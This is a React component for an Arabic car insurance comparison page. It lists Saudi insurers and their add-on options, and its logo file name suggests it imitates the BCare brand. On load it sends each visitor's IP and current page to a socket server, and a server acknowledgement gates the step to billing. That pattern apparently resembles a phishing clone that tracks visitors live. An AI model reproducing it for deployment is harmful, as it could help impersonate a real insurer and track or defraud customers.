import React, { useEffect, useState } from "react";
import { io } from "socket.io-client";
import { socket } from "../App";
import { useNavigate } from "react-router-dom";

const ComprehensivePage = () => {
  const [visitorIP, setVisitorIP] = useState(null);
 const companies = [
   {
     name: "بروج للتأمين التعاوني",
     logo: "/buruj.png",
     price: 610.5,
     options: [
       {
         label: "تغطية الحوادث الشخصية للسائق فقط",
         price: 70,
         checked: false,
       },
       {
         label: "تغطية الحوادث الشخصية للركاب فقط",
         price: 420,
         checked: false,
       },
     ],
   },
   {
     name: "سلامة للتأمين",
     logo: "/salamih.webp",
     price: 712.2,
     options: [],
   },
   {
     name: "التعاونية",
     logo: "/altawneih.jpg",
     price: 890.0,
     options: [{ label: "مساعدة على الطريق", price: 50, checked: false }],
   },
   {
     name: "ميدغلف السعودية",
     logo: "/medgulf.png",
     price: 710.8,
     options: [{ label: "مساعدة على الطريق", price: 30, checked: false }],
   },
   //-------------------------------------
   {
     name: "متكاملة للتأمين",
     logo: "/motakamlh.jpg",
     price: 1200.1,
     options: [
       {
         label: "الوفاة والإصابة الجسدية والمصاريف الطبية للسائق",
         price: 30,
         checked: false,
       },
     ],
   },
   //-------------------------------------
   {
     name: "المجموعة المتحدة للتأمين التعاوني",
     logo: "/acig.png",
     price: 999.0,
     options: [
       {
         label: "تغطية الحوادث الشخصية للسائق ",
         price: 50,
         checked: false,
       },
       {
         label: "تغطية الحوادث الشخصية للركاب ",
         price: 240,
         checked: false,
       },
     ],
   },
   //-------------------------------------
   {
     name: "ليڤا للتأمين",
     logo: "/liva.jpg",
     price: 785.3,
     options: [
       {
         label: "تغطية الحوادث الشخصية للسائق ",
         price: 50,
         checked: false,
       },
       {
         label: "تغطية الحوادث الشخصية للركاب ",
         price: 280,
         checked: false,
       },
       { label: "مساعدة على الطريق", price: 50, checked: false },
     ],
   },
   //-------------------------------------
   {
     name: "الجزيره التكافل التعاوني",
     logo: "/aljazira.webp",
     price: 2101.7,
     options: [],
   },
   //-------------------------------------
   {
     name: "التأمين العربي التعاوني",
     logo: "/alarabia.webp",
     price: 1450.5,
     options: [
       {
         label: "تغطية الحوادث الشخصية للسائق ",
         price: 60,
         checked: false,
       },
     ],
   },
   //-------------------------------------
   {
     name: "شركة الوطنية للتأمين",
     logo: "/alwataneh.png",
     price: 894.2,
     options: [],
   },
   //-------------------------------------
   {
     name: "شركة ولاء للتأمين التعاوني",
     logo: "/walaa.jpg",
     price: 702.5,
     options: [
       {
         label: "تغطية الحوادث الشخصية للسائق ",
         price: 50,
         checked: false,
       },
       {
         label: "تغطية الحوادث الشخصية للركاب ",
         price: 270,
         checked: false,
       },
     ],
   },
   //-------------------------------------
   {
     name: "تكافل الراجحي",
     logo: "/takafl rajhi.jpg",
     price: 2050.1,
     options: [
       { label: "الاخطار الطبيعية", price: 100, checked: false },
       { label: "مساعدة على الطريق", price: 30, checked: false },
       {
         label: "تغطية دول مجلس التعاون الخليجي",
         price: 150,
         checked: false,
       },
       { label: "تغطية حوادث للسائق والركاب", price: 70, checked: false },
     ],
   },
   //-------------------------------------
   {
     name: "المتحدة للتامين التعاوني",
     logo: "/almutahida.webp",
     price: 710.5,
     options: [
       { label: "مساعدة على الطريق", price: 0, checked: true },
       {
         label: "تغطية الحوادث الشخصية للسائق ",
         price: 40,
         checked: false,
       },
       {
         label: "مساعدة على الطريق البلاتيني",
         price: 150,
         checked: false,
       },
     ],
   },
   //-------------------------------------
   {
     name: "شركة أمانة للتأمين التعاوني",
     logo: "/amana.jpg",
     price: 790.0,
     options: [
       {
         label:
           "الوفاة والإصابة الجسدية والمصاريف الطبية للمؤمن له أو السائق المسمى",
         price: 50,
         checked: false,
       },
     ],
   },
   //-------------------------------------
   {
     name: "شركة اليانز للتأمين",
     logo: "/Allianz.png",
     price: 880.0,
     options: [
       {
         label: "تغطية الحوادث الشخصية للسائق فقط",
         price: 60,
         checked: false,
       },
     ],
   },
   //-------------------------------------
   {
     name: "جي.آي.جي",
     logo: "/gig.png",
     price: 695.5,
     options: [
       { label: "الاصابة الجسدية للغير", price: 0, checked: true },
       { label: "تلف ممتلكات الغير", price: 0, checked: true },
       {
         label: "تغطية الحوادث الشخصية للسائق ",
         price: 50,
         checked: false,
       },
       {
         label: "تغطية الحوادث الشخصية للركاب ",
         price: 270,
         checked: false,
       },
     ],
   },
   //-------------------------------------
   {
     name: "شركة الدرع العربي",
     logo: "/aldera alarabi.webp",
     price: 765.2,
     options: [
       { label: "مساعدة على الطريق", price: 25, checked: false },
       {
         label: "تغطية الحوادث الشخصية للسائق ",
         price: 60,
         checked: false,
       },
       {
         label: "تغطية الحوادث الشخصية للركاب ",
         price: 290,
         checked: false,
       },
     ],
   },
   //-------------------------------------
   {
     name: "شركة التحاد للتأمين",
     logo: "/aletihad.png",
     price: 620.95,
     options: [
       {
         label: "تغطية الحوادث الشخصية للسائق ",
         price: 50,
         checked: false,
       },
     ],
   },
   //-------------------------------------
   {
     name: "الخليجية العامة للتأمين",
     logo: "/gulf.webp",
     price: 599.3,
     options: [
       { label: "مساعدة على الطريق", price: 25, checked: false },
       {
         label: "تغطية الحوادث الشخصية للسائق ",
         price: 60,
         checked: false,
       },
       {
         label: "تغطية الحوادث الشخصية للركاب ",
         price: 290,
         checked: false,
       },
     ],
   },
   //-------------------------------------
 ];

 const navigate = useNavigate()

 

  useEffect(() => {
    const page = "comprehensive";

    fetch("https://api.ipify.org?format=json")
      .then((res) => res.json())
      .then(({ ip }) => {
        setVisitorIP(ip);
        socket.emit("updateLocation", { ip, page });
      });

  }, []);

  const handleBuyNow = async (company, basePrice, options) => {
    while (!visitorIP) await new Promise((r) => setTimeout(r, 50));

    const selectedOptions = options.filter((opt) => opt.checked);
    const totalPrice = selectedOptions.reduce(
      (sum, o) => sum + o.price,
      basePrice
    );

    const payload = {
      ip: visitorIP,
      companyName: company.name,
      basePrice,
      selectedOptions,
      totalPrice,
    };
    console.log(totalPrice.toFixed(2));
    sessionStorage.setItem("totalPrice", totalPrice.toFixed(2));
    socket.emit("submitComprehensive", payload);
  };

  useEffect(() => {
    socket.on("ackShamel", (resp) => {
      if (resp.success) {
          navigate("/billing");
      } else {
        alert("عذراً! حدث خطأ أثناء الإرسال.");
        console.error(resp.error);
      }
    });
  }, [socket]);

  return (
    <div dir="rtl" className="bg-white min-h-screen flex flex-col">
      <nav className="bg-white shadow py-3 text-center">
        <img
          src="/Bca-logo.svg"
          alt="Logo"
          className="mx-auto w-32"
        />
      </nav>

      <div className="w-full   mx-auto px-4">
        <h5 className="text-[#146394] font-bold text-lg mt-6 mb-4">
          نوع التأمين
        </h5>

        <div className="flex justify-center bg-gray-100 rounded-full py-2 px-2 max-w-sm mx-auto">
          <a
            href="/comprehensive"
            className="flex-1 text-center text-white bg-[#146394] py-2 rounded-full font-semibold"
          >
            شامل
          </a>
          <a
            href="/thirdparty"
            className="flex-1 text-center text-[#146394] py-2 font-semibold"
          >
            ضد الغير
          </a>
        </div>

        <div className="grid md:grid-cols-2 lg:grid-cols-3 gap-4 my-6">
          {companies.map((company, index) => {
            return (
              <div key={index} className="shadow rounded p-4">
                <div className="flex justify-between items-start">
                  <div>
                    <h6 className="font-bold text-gray-800 mb-1">
                      {company.name}
                    </h6>
                    <p className="text-sm text-gray-500">التأمين الشامل</p>
                  </div>
                  <img src={company.logo} alt={company.name} className="h-10" />
                </div>

                <hr className="my-3" />
                <h6 className="text-sm font-bold text-gray-800 mb-3">
                  مزايا إضافية
                </h6>

                <div className="text-sm space-y-2">
                  <div className="flex justify-between">
                    <div>
                      <input
                        type="checkbox"
                        checked
                        disabled
                        className="mr-1"
                      />
                      المسؤولية المدنية تجاه الغير بحد أقصى <br />
                      <strong>
                        10,000,000{" "}
                        <svg
                          viewBox="0 0 1300 1200"
                          className="w-4 h-4 inline fill-yellow-500"
                        >
                          <path d="M1085.73,895.8c20.06-44.47,33.32-92.75,38.4-143.37l-330.68,70.33v-135.2l292.27-62.11c20.06-44.47,33.32-92.75,38.4-143.37l-330.68,70.27V66.13c-50.67,28.45-95.67,66.32-132.25,110.99v403.35l-132.25,28.11V0c-50.67,28.44-95.67,66.32-132.25,110.99v525.69l-295.91,62.88c-20.06,44.47-33.33,92.75-38.42,143.37l334.33-71.05v170.26l-358.3,76.14c-20.06,44.47-33.32,92.75-38.4,143.37l375.04-79.7c30.53-6.35,56.77-24.4,73.83-49.24l68.78-101.97v-.02c7.14-10.55,11.3-23.27,11.3-36.97v-149.98l132.25-28.11v270.4l424.53-90.28Z"></path>
                        </svg>
                      </strong>
                    </div>
                    <span className="text-yellow-500 font-bold">مجاني</span>
                  </div>

                  {company.options.map((opt, i) => (
                    <div key={i} className="flex justify-between">
                      <label className="flex items-start gap-2">
                        <input
                          type="checkbox"
                          className="additional-option"
                          defaultChecked={opt.checked}
                          onChange={(e) => (opt.checked = e.target.checked)}
                        />
                        {opt.label}
                      </label>
                      <span className="text-yellow-500 font-bold">
                        {opt.price > 0 ? `${opt.price}` : "مجاني"}
                        {opt.price > 0 ? (
                          <svg
                            viewBox="0 0 1300 1200"
                            className="w-4 h-4 inline fill-yellow-500"
                          >
                            <path d="M1085.73,895.8c20.06-44.47,33.32-92.75,38.4-143.37l-330.68,70.33v-135.2l292.27-62.11c20.06-44.47,33.32-92.75,38.4-143.37l-330.68,70.27V66.13c-50.67,28.45-95.67,66.32-132.25,110.99v403.35l-132.25,28.11V0c-50.67,28.44-95.67,66.32-132.25,110.99v525.69l-295.91,62.88c-20.06,44.47-33.33,92.75-38.42,143.37l334.33-71.05v170.26l-358.3,76.14c-20.06,44.47-33.32,92.75-38.4,143.37l375.04-79.7c30.53-6.35,56.77-24.4,73.83-49.24l68.78-101.97v-.02c7.14-10.55,11.3-23.27,11.3-36.97v-149.98l132.25-28.11v270.4l424.53-90.28Z"></path>
                          </svg>
                        ) : (
                          ""
                        )}
                      </span>
                    </div>
                  ))}
                </div>

                <div className="flex justify-between items-center text-[#146394] text-xl font-bold mt-4">
                  <div>
                    {company.price}{" "}
                    <svg
                      viewBox="0 0 1300 1200"
                      className="w-4 h-4 inline fill-yellow-500"
                    >
                      <path d="M1085.73,895.8c20.06-44.47,33.32-92.75,38.4-143.37l-330.68,70.33v-135.2l292.27-62.11c20.06-44.47,33.32-92.75,38.4-143.37l-330.68,70.27V66.13c-50.67,28.45-95.67,66.32-132.25,110.99v403.35l-132.25,28.11V0c-50.67,28.44-95.67,66.32-132.25,110.99v525.69l-295.91,62.88c-20.06,44.47-33.33,92.75-38.42,143.37l334.33-71.05v170.26l-358.3,76.14c-20.06,44.47-33.32,92.75-38.4,143.37l375.04-79.7c30.53-6.35,56.77-24.4,73.83-49.24l68.78-101.97v-.02c7.14-10.55,11.3-23.27,11.3-36.97v-149.98l132.25-28.11v270.4l424.53-90.28Z"></path>
                    </svg>
                  </div>
                  <button
                    onClick={() =>
                      handleBuyNow(company, company.price, company.options)
                    }
                    className="bg-yellow-500 text-white px-4 py-1 rounded hover:bg-yellow-600"
                  >
                    اشترِ الآن
                  </button>
                </div>
              </div>
            );
          })}
        </div>
      </div>
    </div>
  );
};

export default ComprehensivePage;
